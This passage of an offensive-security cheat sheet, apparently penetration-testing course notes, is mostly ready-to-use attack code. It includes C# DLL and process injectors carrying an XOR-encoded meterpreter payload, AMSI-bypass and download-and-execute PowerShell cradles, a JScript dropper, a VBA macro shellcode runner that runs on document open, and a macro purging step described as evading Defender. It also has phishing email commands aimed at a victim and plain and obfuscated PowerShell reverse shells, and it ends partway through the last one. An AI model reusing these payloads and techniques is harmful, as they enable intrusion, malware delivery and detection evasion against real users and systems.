        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

        String dir =
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\your.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://Your_Server/your.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr,
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
"LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
addr, 0, IntPtr.Zero);
        }
    }
}
```
<br>
<br>

## Shellcode_Runner

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{

        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
dwMilliseconds);

            static void Main(string[] args)
            {

                byte[] buf = new byte[YOUR_SIZE] {YOUR_SHELLCODE};

                int size = buf.Length;

                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                Marshal.Copy(buf, 0, addr, size);

                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
    }
}
```
<br>
<br>

## Process_injection

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RemoteShinject
{
    public class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // Xor-encoded payload, key 0xfa
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= EXITFUNC=thread -f csharp
            byte[] buf = new byte[668] {
            0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
            0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
            0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
            0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
            0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab, 0x71, 0xb8, 0xc6, 0xb2,
            0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
            0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0xbe,
            0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x71, 0xb2, 0xe2, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xbb,
            0x71, 0xce, 0x72, 0xb7, 0xcb, 0x33, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b,
            0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
            0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
            0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
            0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
            0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
            0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
            0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc,
            0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb,
            0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
            0x12, 0xf7, 0xfa, 0xfa, 0xfa, 0xcb, 0xcd, 0xc8, 0xd4, 0xc8, 0xcb, 0xd4, 0xc8, 0xc9, 0xd4,
            0xcb, 0xca, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7,
            0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa,
            0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x8e, 0xfa, 0xfa, 0xfa, 0xd5, 0xbd, 0x9b, 0xca, 0x91, 0xab,
            0xa5, 0xc3, 0xcc, 0xa3, 0xa3, 0xa0, 0xb0, 0xbb, 0xaf, 0x9d, 0xbe, 0xb1, 0xca, 0xca, 0xcb,
            0xb4, 0xab, 0x82, 0xb3, 0xae, 0xc9, 0xb4, 0xb2, 0x9d, 0xa3, 0xce, 0x9e, 0x8b, 0xbf, 0xcf,
            0xcc, 0x88, 0x80, 0x91, 0x8d, 0xa0, 0xae, 0x9d, 0xb9, 0x97, 0xcc, 0xcb, 0xaa, 0x91, 0x97,
            0xab, 0xab, 0xab, 0x92, 0x97, 0xa8, 0xa3, 0xb3, 0xb7, 0x97, 0xb6, 0x83, 0xa2, 0xad, 0xbb,
            0xcb, 0x8b, 0x89, 0xbc, 0x8d, 0xaa, 0x98, 0xcf, 0xbf, 0x80, 0xaf, 0xbc, 0xbe, 0xcd, 0xc3,
            0x91, 0xc3, 0xa9, 0x82, 0xca, 0xb4, 0xaa, 0x82, 0x9b, 0xc3, 0xce, 0xa0, 0x89, 0x95, 0xa2,
            0xcf, 0xb2, 0x9e, 0xa0, 0xb3, 0xa8, 0xb7, 0xb6, 0xa3, 0xa9, 0xa2, 0x9c, 0x96, 0x88, 0xd7,
            0xbc, 0x80, 0x93, 0xa3, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33,
            0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3,
            0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2,
            0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90,
            0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
            0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9,
            0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2,
            0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa,
            0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa,
            0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa,
            0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
            0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d,
            0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa,
            0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71,
            0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0xb3,
            0x3d, 0x38, 0x0a, 0x4f, 0x58, 0xac, 0x05, 0x2f};
            int len = buf.Length;

            // Parse arguments, if given (process to inject)
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0) {
                // Inject based on elevation level
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "spoolsv";
                } 
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "explorer";
                }
            }
            else
            {
                Console.WriteLine("Please give either one argument for a process to inject, e.g. \".\\ShInject.exe explorer\", or leave empty for auto-injection.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get process IDs
            Process[] expProc = Process.GetProcessesByName(procName);

            // If multiple processes exist, try to inject in all of them
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Get a handle on the process
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                }

                // Write the payload to the allocated bytes
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}

```
<br>
<br>

## SharpLoader

[Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')

- First, encrypt all your csharp files on the attacker machine using invoke-sharpencrypt.
- Second, places all your encrypted files on your apache server.
- Third, create a powershell script using the amsi string below.
- Fourth, Run the amsi script inside the powershell cradle. Finally, Run Invoke-sharploader inside a powershell cradle.

<br>

### 1/2

```csharp
Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
```
<br>

### 3

```powershell
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```
<br>

### 3

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.1.10/amsi.ps1')
```
<br>

### 4

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.1.10/Invoke-SharpLoader.ps1');Invoke-SharpLoader -location https://192.168.1.10/runner.enc -password SuperDumperStrongPassword -noArgs
```
<br>
<br>

# Javascript

## Download&Execute

```javascript
var url = "http://YOUR_SERVER/YOUR.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("YOUR.exe");
```
<br>
<br>


# Phishing

<br>
	
## XOR_VBA

- Generate shellcode with msfvenom and place here.
- Build with csc and run with mono.
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EncryptVBA
{
    class Program
    {
    static void Main(string[] args)
    {
    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.38 LPORT=3333 -f csharp
    byte[] buf = new byte[619] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0d,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x05,0x0d,0x00,0x00,0x4d,
0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,
0x00,0x00,0xff,0xd5,0xe8,0x43,0x00,0x00,0x00,0x2f,0x69,0x65,0x77,0x5a,0x56,
0x75,0x65,0x41,0x76,0x39,0x35,0x4a,0x6b,0x30,0x69,0x52,0x4b,0x34,0x69,0x44,
0x67,0x41,0x78,0x54,0x6a,0x49,0x58,0x53,0x68,0x32,0x35,0x74,0x51,0x55,0x35,
0x36,0x4f,0x39,0x68,0x77,0x36,0x66,0x44,0x48,0x49,0x6f,0x78,0x6d,0x5f,0x73,
0x38,0x7a,0x6c,0x4a,0x6d,0x72,0x76,0x46,0x71,0x51,0x41,0x4c,0x67,0x66,0x59,
0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,
0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,
0xa2,0x56,0xff,0xd5 };
    byte[] encoded = new byte[buf.Length];
    for (int i = 0; i < buf.Length; i++)

    {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
    }
    uint counter = 0;
    StringBuilder hex = new StringBuilder(encoded.Length * 2);
    foreach (byte b in encoded)
    {
    hex.AppendFormat("{0:D}, ", b);
    counter++;
    if (counter % 50 == 0)
    {
    hex.AppendFormat("_{0}", Environment.NewLine);
    }
    }
    Console.WriteLine("The payload is: " + hex.ToString());
    }
    }
}
```
<br>

## VBA_Runner
- Place XOR shellcode into vba file.
- Copy or input file into macro on your word doc or docm.

```powershell
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    buf = Array(SHELLCODE)

For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
<br>

## Purge

- Download the repo below and build with visual studio.
- Purge the word doc/docm you just created with the code above.
- As of 27/02/2022 18:10 this is undetectable by defender.

- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
<br>

## Deploy:
***
<br>

### Method 1:
```
swaks --body 'click me http://192.168.X.X/file.hta' --add-header
"Really: 1.0" --add-header "Content-Type: text/html" --header
"Subject: Important" -t victim@corp.com -f attacker@corp.com --server
192.168.X.X
```
<br>

### Method 2:
 ```
 sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
```
<br>

# Powershell
<br>

### Reverse Shell

-  Replace ip/port, save as .txt file and host on your server

```powershell
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
// Setup IPADDR
$address = '192.168.1.13'
// Setup PORT
$port = '4242'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
```
<br>
<br>

### Obfuscated_RevShell

- A better powershell rev shell... just replace ip and port at the bottom

```powershell
function _/=\/==\_/==\_____ 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        ${__/==\/=\_/==\/==\},
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        ${__/====\/\___/=\/\},
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        ${__/\/\/=\_/\/\____},
        [Parameter(ParameterSetName="bind")]
        [Switch]
        ${__/=\_/\___/\/\__/}
    )
    try 
    {
        if (${__/\/\/=\_/\/\____})
        {
            ${/=\___/\__/\___/=} = New-Object System.Net.Sockets.TCPClient(${__/==\/=\_/==\/==\},${__/====\/\___/=\/\})
        }
        if (${__/=\_/\___/\/\__/})
        {
            ${_/===\___/=====\_} = [System.Net.Sockets.TcpListener]${__/====\/\___/=\/\}
            ${_/===\___/=====\_}.start()    
            ${/=\___/\__/\___/=} = ${_/===\___/=====\_}.AcceptTcpClient()
        } 
        ${/==\/====\___/\_/} = ${/=\___/\__/\___/=}.GetStream()
        [byte[]]${/==\/===\_/\_____} = 0..65535|%{0}
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        while((${/===\__/=\/=\_/==} = ${/==\/====\___/\_/}.Read(${/==\/===\_/\_____}, 0, ${/==\/===\_/\_____}.Length)) -ne 0)
        {
            ${/=\______/\__/\/=} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/\/\__/\/\____/\} = ${/=\______/\__/\/=}.GetString(${/==\/===\_/\_____},0, ${/===\__/=\/=\_/==})
            try
            {
                ${/=\/=\/\__/=\/==\} = (iex -Command ${_/\/\__/\/\____/\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${__/\____/===\/\__}  = ${/=\/=\/\__/=\/==\} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${__/==\/==\_/\_/\/} = ($error[0] | Out-String)
            $error.clear()
            ${__/\____/===\/\__} = ${__/\____/===\/\__} + ${__/==\/==\_/\_/\/}
            ${___/==\__/\___/==} = ([text.encoding]::ASCII).GetBytes(${__/\____/===\/\__})
